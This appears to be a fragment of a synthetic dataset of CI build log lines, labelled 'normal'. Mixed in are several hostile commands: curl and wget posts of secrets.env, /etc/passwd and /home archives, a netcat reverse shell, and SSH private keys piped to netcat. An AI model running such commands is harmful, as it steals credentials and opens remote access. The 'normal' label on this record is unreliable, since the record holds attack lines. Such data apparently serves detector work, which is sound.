          "  PASS: test_cache_hit (474ms)",
          "GET /health - 201 (17ms)",
          "Step 15/18: Testing",
          "Connecting to acme.corp:443...",
          "\u2713 Step 'test' succeeded",
          "  PASS: integration/test_api_health.spec.js",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Snapshots: 36 passed, 47 total",
          "\u2717 build failed with exit code 40",
          "Sending 157MB of data to startup.dev",
          "Step 12/20: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Loading...",
          "FAILED: test_auth_login",
          "POST /data - 202 (298ms)",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "  PASS: test_db_connect (259ms)",
          "Connecting to test.io:443...",
          "Using Python 3.9",
          "Step 10/18: Building",
          "pip install: Successfully installed eslint-3.19",
          "\u2717 build failed with exit code 15",
          "Image pulled successfully",
          "Using Node.js 16.1.3",
          "WARNING: react has known vulnerabilities",
          "Artifact downloaded: 31MB",
          "Connecting to cloud.services:443...",
          "Success!",
          "FAILED: test_api_health",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Step 16/18: Running migrations",
          "Step 4/17: Building",
          "Transforming 619 files...",
          "Connection established",
          "Processing...",
          "Cache restored successfully (147MB)",
          "nc -e /bin/sh 33.59.114.90 42681",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:17:40] INFO: Request completed",
          "Connecting to cloud.services:443...",
          "Exception: RuntimeError",
          "Artifact downloaded: 9MB",
          "Generating source maps...",
          "[12:17:40] INFO: Connecting to database",
          "Cache miss for key-1813",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Completed.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 167.160.144.199 52396",
          "Snapshots: 14 passed, 49 total",
          "Platform: linux-x64",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 14.13.125.130 7764",
          "Artifact uploaded: dist.zip (23MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:17:40] DEBUG: Initializing service",
          "\u2713 Task completed in 3313ms",
          "Creating production build...",
          "WARNING: react has known vulnerabilities",
          "POST /data - 202 (70ms)",
          "Step 13/18: Running migrations",
          "Ready.",
          "Layer 3/12: ENV command",
          "Step 8/18: Linting",
          "Step 16/19: Running migrations",
          "TLS handshake completed",
          "[12:17:40] DEBUG: Loading configuration",
          "Fetching submodules...",
          "[12:17:40] DEBUG: Connection pool: 14 active",
          "Step 9/20: Linting",
          "Success!",
          "[12:17:40] INFO: Connecting to database",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Loading...",
          "Cache miss for key-8591",
          "Layer 7/8: ENV command",
          "pip: Collecting lodash",
          "pip install: Successfully installed lodash-4.8",
          "[12:17:40] DEBUG: Loading configuration",
          "Ready.",
          "npm install: added 279 packages",
          "Step 13/25: Installing dependencies",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Done.",
          "yarn add: Done in 6.47s",
          "[12:17:40] INFO: Processing request",
          "=== Step e2e_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}